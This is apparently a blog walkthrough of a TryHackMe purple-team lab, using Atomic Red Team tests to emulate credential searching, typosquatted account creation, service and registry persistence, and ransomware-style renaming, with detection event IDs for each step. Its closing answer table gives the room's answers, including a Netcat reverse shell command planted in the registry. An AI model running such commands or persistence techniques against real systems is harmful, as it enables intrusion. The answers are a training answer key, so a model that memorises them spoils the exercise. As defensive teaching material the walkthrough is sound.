---
title: 'TryHackMe: Atomic Bird Goes Purple #2'
date: 2026-03-08T20:08:00
draft: false
tags:
  - tryhackme
  - walkthrough
  - purple-team
  - threat-emulation
  - atomic-red-team
  - persistence
  - registry
  - credential-access
  - defense-evasion
description: 'Part 2 of the Atomic Bird Goes Purple Purple Team series. Covers cleartext credential discovery, typosquatted decoy account creation, malicious service installation, registry defacement, ransomware-style file renaming, and reverse shell persistence via registry. Techniques: T1552.001, T1078.003, T1543.003, T1491, T1112, T1012.'
cover:
  image: /images/frostfire2.png
  alt: ''
  caption: ''
  relative: false
---

# TryHackMe: Atomic Bird Goes Purple #2

**Author:** Mario Martinez Jr. (ku5e / Gary7) | TryHackMe USA Rank #76 | Top 1%

**Difficulty:** Medium

**Topics:** Purple Teaming, Threat Emulation, Atomic Red Team, Credential Access, Defense Evasion, Persistence, Registry Manipulation, Service Creation

***

Answers are redacted within the narrative to allow you to complete the tasks on your own, but a full table of answers is available at the end of this walkthrough.

This room continues the Atomic Bird Goes Purple series. Where Part 1 focused on discovery, credential prompts, and file integrity, Part 2 moves deeper into the attack chain: finding cleartext credentials, creating decoy accounts using typosquatting, building malicious services, defacing internal systems through the registry, bulk-renaming files for ransom simulation, and planting a reverse shell command in a registry key.

<!--image 5-->

***

## Task 1: Introduction

Start the VM and proceed. The room maps two active tasks across six technique references spanning Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Collection, and Impact.

Complete Part 1 before working this room. The toolset is identical: THM-Utils, Atomic Red Team, PowerShell, Windows Event Viewer, and Registry Editor.

***

## Task 2: In-Between — Discover and Hide

### Technical Deep Dive: T1552.001 and T1078.003

**T1552.001 — Credentials in Files** covers searching the filesystem for configuration files, scripts, and documents that contain credentials stored in plaintext. Developers, sysadmins, and automated tools frequently write credentials to disk in YAML configs, XML files, `.bak` backups, and `.ini` files. An attacker with read access to the filesystem can find usable credentials without triggering authentication events.

The detection angle: file access events in Sysmon (Event ID 11 for file creation, Event ID 23 for file deletion) and PowerShell Operational logs recording the search commands. Any process walking the filesystem and reading configuration files outside expected behavior is a detection candidate.

**T1078.003 — Valid Accounts: Local Accounts** covers adversaries creating or hijacking local accounts to maintain access. The typosquatting variant creates an account with a name nearly identical to an existing privileged account. A human glancing at a user list will miss it. Automated tooling that does exact string matching will also miss it unless the detection rule accounts for near-matches.

**T0002-1: Search Cleartext Data**

Clear logs, then run:

```powershell
THM-LogClear-All
Invoke-AtomicTest T0002-1
```

The test creates a document on the Desktop with results from the cleartext credential search. Open it. The detected PowerShell library file is **[REDACTED]**.

The test searches for common credential-bearing file types. The default script does not include `.bak` files. Navigate to the atomics path and open the executed script. The code snippet to add `.bak` files to the search is **[REDACTED]**.

After modifying the script, run cleanup and re-execute:

```powershell
Invoke-AtomicTest T0002-1 -Cleanup
Invoke-AtomicTest T0002-1
```

Open the output file. Among the detected files, locate the secret key: **[REDACTED]**

<!--image 1-->

**T0002-2: Create Clone/Decoy Account**

Clear logs, then run:

```powershell
THM-LogClear-All
Invoke-AtomicTest T0002-2
```

Investigate the logs after execution. The new account name is **[REDACTED]**.

Look carefully at the spelling. The account name is one character off from the built-in Administrator account. This is typosquatting applied to local user accounts. A defender reviewing the user list quickly will not catch it. The detection requires either exact comparison against expected account names or alerting on any new local account creation event (Windows Security Event ID 4720).

<!--image 2-->

Cleanup:

```powershell
Invoke-AtomicTest T0002-1 -Cleanup
Invoke-AtomicTest T0002-2 -Cleanup
```

***

## Task 3: Manipulate, Deface, Persistence

### Technical Deep Dive: T1543.003, T1491, T1112, and T1012

**T1543.003 — Create or Modify System Process: Windows Service** covers adversaries installing malicious Windows services for persistence. A service registered with the SCM (Service Control Manager) survives reboots, runs under SYSTEM or a specified account, and does not require a logged-in user. Detection relies on Event ID 4697 (service installation) in the Security log and Sysmon Event ID 13 (registry value set) when the service key is written to `HKLM\SYSTEM\CurrentControlSet\Services`.

**T1491 — Internal Defacement** covers modifying internal-facing content to disrupt operations or deliver a message. In this exercise the defacement is delivered via registry modification, simulating how ransomware drops a ransom note into a location that users will encounter.

**T1112 — Modify Registry** and **T1012 — Query Registry** cover reading and writing registry keys for persistence, configuration, and data storage. Attackers use the registry because it persists across reboots, is not a traditional file, and is less likely to be monitored by file integrity tools. A reverse shell command stored as a registry value is invisible to file scanners.

**T0003-1: Internal Service Creation**

Clear logs, then run:

```powershell
THM-LogClear-All
Invoke-AtomicTest T0003-1
```

The test creates a Windows service. The service name is **[REDACTED]**.

Check the registry key created for the service. The image path (the executable the service runs) is set to **[REDACTED]**.

<!--image 1-->

**T0003-2: Defacement with Registry**

Clear logs, then run:

```powershell
THM-LogClear-All
Invoke-AtomicTest T0003-2
```

The test sets a registry value used to deliver a ransom note. Locate the note. The content is **[REDACTED]**.

**T0003-3: File Changes Like a Ransom**

Clear logs, then run:

```powershell
THM-LogClear-All
Invoke-AtomicTest T0003-3
```

The test bulk-renames files by appending a new extension, simulating ransomware's file encryption and renaming behavior. The updated file extension is **[REDACTED]**.

Sysmon Event ID 11 (FileCreate) will show the renamed files. The volume of file rename events in a short window is a high-fidelity ransomware detection signal. Most ransomware detection rules are built on this exact pattern: rapid sequential file modifications or renames across multiple directories.

<!--image 3-->

**T0003-4: Planting Reverse Shell Command in Registry**

Clear logs, then run:

```powershell
THM-LogClear-All
Invoke-AtomicTest T0003-4
```

The test writes a reverse shell command into a registry value. Query the registry key to find the planted value. The assigned value is **[REDACTED]**.

This technique stores a Netcat reverse shell command in the registry for later execution. The registry value itself is not executable — an attacker would need a separate trigger to call it. Common triggers include run keys, scheduled tasks, or service image paths that reference the registry value. Detection: Sysmon Event ID 13 logging the registry write, and any process subsequently reading that key.

<!--image 4-->

Cleanup:

```markdown
Invoke-AtomicTest T0003-1 -Cleanup
Invoke-AtomicTest T0003-2 -Cleanup
Invoke-AtomicTest T0003-3 -Cleanup
Invoke-AtomicTest T0003-4 -Cleanup
```

***

## Task 4: Conclusion

The two Atomic Bird Goes Purple rooms cover a complete adversary simulation cycle from initial access through persistence and impact. The techniques across both rooms map to real TTPs observed in ransomware campaigns, credential theft operations, and APT intrusions.

The recommended next rooms are Tempest and Caldera, which extend the purple team methodology into more complex scenarios.

***

## Answer Table

| Task | Question | Answer |
| --- | --- | --- |
| 2 | Detected PowerShell library file | YamlDotNet.xml |
| 2 | Code snippet to add .bak files | ,\*.bak |
| 2 | Secret key from output file | L1LAFLHQ5peGsjh7Pee8wHFY1SBQHe85A1HZhVrK47Yf6cqmH3n8 |
| 2 | New decoy account name | Adminstrator |
| 3 | Name of created service | thm-registered-service |
| 3 | Image path of created service | C:\Windows\system32\services.exe |
| 3 | Ransom note content | THM{THM_Offline_Index_Emulation} |
| 3 | Updated file extension | .thm-jhn |
| 3 | Malicious registry value | nc 10.10.thm.jhn 4499 -e powershell |

***

_Walkthrough by Mario Martinez Jr. (ku5e / Gary7) | _[_TryHackMe Profile_](https://tryhackme.com/p/ku5e)_ | _[_ku5e.com/blog_](https://ku5e.com/blog)
